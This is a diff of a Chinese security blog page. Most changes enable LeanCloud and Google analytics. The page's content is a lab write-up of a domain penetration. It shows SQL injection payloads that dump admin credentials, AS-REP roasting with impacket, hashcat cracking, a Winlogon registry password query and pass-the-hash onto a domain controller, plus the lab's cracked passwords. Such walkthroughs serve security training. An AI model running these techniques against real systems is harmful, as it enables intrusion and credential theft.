@@ -104,7 +104,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.susec.xyz","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.susec.xyz","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"A3t4PtWLmbagcqhmt5hLbHws-MdYXbMMI","app_key":"HVBQatbtbgezZh05pZTT4NW5","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -114,6 +114,35 @@
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
   
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
 
 
   
@@ -273,6 +302,14 @@
 
     
     
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
   </div>
 
 
@@ -312,7 +349,7 @@
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Parameter: #<span class="hljs-number">1</span>* ((custom) POST)<br>    <span class="hljs-keyword">Type</span>: <span class="hljs-type">time</span>-based blind<br>    Title: MySQL &gt;= <span class="hljs-number">5.0</span><span class="hljs-number">.12</span> <span class="hljs-keyword">AND</span> <span class="hljs-type">time</span>-based blind (query SLEEP)<br>    Payload: username=<span class="hljs-string">&#x27; AND (SELECT 7022 FROM (SELECT(SLEEP(5)))YvJE) AND &#x27;</span>Plo<span class="hljs-string">e&#x27;=&#x27;</span>Ploe&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">Type</span>: <span class="hljs-keyword">UNION</span> query<br>    Title: Generic <span class="hljs-keyword">UNION</span> query (<span class="hljs-keyword">NULL</span>) - <span class="hljs-number">3</span> <span class="hljs-keyword">columns</span><br>    Payload: username=<span class="hljs-string">&#x27; UNION ALL SELECT NULL,CONCAT(0x716a706a71,0x766a7654666358706e6c4a774146704b554275475342437566576f61465352534258476969567747,0x71716a7171),NULL-- -&amp;password=1</span><br></code></pre></td></tr></table></figure>
 <p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250224163649408.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>爆完库名到表名<br>limit 0,1时爆出来的是oa_admin，应该是管理员账号密码，等下再看<br>1，1爆出flag表<br>%27+UNION+SELECT+1%2Ctable_name%2C3+FROM+information_schema.tables+WHERE+table_schema%3D%27oa_db%27LIMIT+1,1–+-<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310110225561.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>读取一下列名<br>%27+UNION+SELECT+1%2CGROUP_CONCAT%28column_name%29%2C3+FROM+information_schema.columns+WHERE+table_name%3D%27oa_f1Agggg%27–+-<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310110612486.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>读取数据<br>%27+UNION+SELECT+NULL%2Cflag02%2CNULL+FROM+oa_f1Agggg+LIMIT+0%2C1–+-<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310110810243.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>成功<br>再回去读一下oa_admin<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310110958695.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>拿到管理员账号密码<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310111236325.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>administrator&#x2F;bo2y8kAL3HnXUiQo<br>但是还是登不进去啊，我猜是不是还有别的表<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310111347209.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>oa_users，这里可能有喷洒的数据<br>%27+UNION+SELECT+NULL%2C%28SELECT+GROUP_CONCAT%28email+SEPARATOR+%27%5Cn%27%29+FROM+%28SELECT+%2A+FROM+oa_users+LIMIT+50+OFFSET+0%29tmp%29%2CNULL–+-<br>可以通过这个指令读取，我看了里面一共500个账户，我把email，username，phone都弄了下来，过程繁琐，不多演示</p>
-<p>其实比较主要的是email，我们尝试使用Kerberos AS-REP Roasting攻击<br>这种攻击是尝试从 Active Directory 获取不需要预身份验证的用户的加密凭证信息<br>proxychains4 -q impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile email.txt xiaorang.lab&#x2F;<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310113249299.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>爆破出两个<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310113451334.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310113510830.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我们可以通过hashcat去爆破出明文，耗时可能有点长，这里直接给出爆破的指令跟结果<br>hashcat -a 0 -m 18200 –force hash.txt rockyou.txt<br><a href="mailto:&#x7a;&#x68;&#x61;&#x6e;&#x67;&#120;&#x69;&#110;&#x40;&#x78;&#x69;&#x61;&#111;&#x72;&#97;&#110;&#x67;&#46;&#x6c;&#97;&#98;">&#x7a;&#x68;&#x61;&#x6e;&#x67;&#120;&#x69;&#110;&#x40;&#x78;&#x69;&#x61;&#111;&#x72;&#97;&#110;&#x67;&#46;&#x6c;&#97;&#98;</a>&#x2F;strawberry<br><a href="mailto:&#x77;&#101;&#x6e;&#x73;&#x68;&#x61;&#x6f;&#x40;&#x78;&#x69;&#97;&#111;&#114;&#97;&#x6e;&#x67;&#x2e;&#x6c;&#x61;&#98;">&#x77;&#101;&#x6e;&#x73;&#x68;&#x61;&#x6f;&#x40;&#x78;&#x69;&#97;&#111;&#114;&#97;&#x6e;&#x67;&#x2e;&#x6c;&#x61;&#98;</a>&#x2F;hellokitty<br>我们直接远程连接<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310113824373.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>那我们也成功拿下了域成员的主机<br>我们再做一下信息收集，只要能顺利提权或是横向到域管，基本就结束了<br>我们使用bloodhound对域信息进行整理<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310140739312.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>最后会出一个zip，我们导入查看就行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310141652632.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>可以看到我们需要登上yuxuan这个账号，再去横<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310143044532.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>其实比较主要的是email，我们尝试使用Kerberos AS-REP Roasting攻击<br>这种攻击是尝试从 Active Directory 获取不需要预身份验证的用户的加密凭证信息<br>proxychains4 -q impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile email.txt xiaorang.lab&#x2F;<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310113249299.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>爆破出两个<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310113451334.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310113510830.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我们可以通过hashcat去爆破出明文，耗时可能有点长，这里直接给出爆破的指令跟结果<br>hashcat -a 0 -m 18200 –force hash.txt rockyou.txt<br><a href="mailto:&#x7a;&#x68;&#97;&#x6e;&#103;&#120;&#x69;&#110;&#64;&#120;&#105;&#x61;&#x6f;&#x72;&#x61;&#x6e;&#x67;&#46;&#x6c;&#97;&#x62;">&#x7a;&#x68;&#97;&#x6e;&#103;&#120;&#x69;&#110;&#64;&#120;&#105;&#x61;&#x6f;&#x72;&#x61;&#x6e;&#x67;&#46;&#x6c;&#97;&#x62;</a>&#x2F;strawberry<br><a href="mailto:&#119;&#101;&#110;&#x73;&#104;&#x61;&#x6f;&#x40;&#120;&#x69;&#97;&#111;&#x72;&#97;&#110;&#103;&#46;&#108;&#97;&#98;">&#119;&#101;&#110;&#x73;&#104;&#x61;&#x6f;&#x40;&#120;&#x69;&#97;&#111;&#x72;&#97;&#110;&#103;&#46;&#108;&#97;&#98;</a>&#x2F;hellokitty<br>我们直接远程连接<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310113824373.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>那我们也成功拿下了域成员的主机<br>我们再做一下信息收集，只要能顺利提权或是横向到域管，基本就结束了<br>我们使用bloodhound对域信息进行整理<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310140739312.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>最后会出一个zip，我们导入查看就行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310141652632.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>可以看到我们需要登上yuxuan这个账号，再去横<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310143044532.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>而我们点击一下又可以知道，我们这台主机是用于yuxuan的会话记录的，我们可以通过查询注册表来获取它的信息<br><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310143643020.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>拿到明文密码，我们再登陆上去<br>yuxuan&#x2F;Yuxuan7QbrgZ3L<br>按道理来说，bloodhound上显示HasSIDHistory，那我们应该有着跟administrator完全一样的系统权限，但我们还是打不开administrator的文件夹，所以我们还要抓到administrator的hash<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310144924595.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>导出了，那我们可以pth登录administrator<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310145426196.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>先是拿下本机的flag<br>然后同理直接登录域控<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310145612360.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>完成<br>最后再做一下总结<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310160527760.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 
                 
@@ -406,9 +443,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/04/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/" title="春秋云境-Certify">
+                      <a href="/2025/04/04/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY16-Rootme/" title="重生之我在try hack me打靶，励志成为赛博高手-DAY16-Rootme">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">春秋云境-Certify</span>
+                        <span class="hidden-mobile">重生之我在try hack me打靶，励志成为赛博高手-DAY16-Rootme</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -416,8 +453,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/04/04/pwned-labs-AWS%20S3%20Enumeration%20Basics/" title="AWS S3 Enumeration Basics">
-                        <span class="hidden-mobile">AWS S3 Enumeration Basics</span>
+                      <a href="/2025/04/04/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/" title="春秋云境-Certify">
+                        <span class="hidden-mobile">春秋云境-Certify</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -519,6 +556,31 @@
   <footer>
     <div class="footer-inner">
   
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
   
   
   
@@ -663,6 +725,8 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
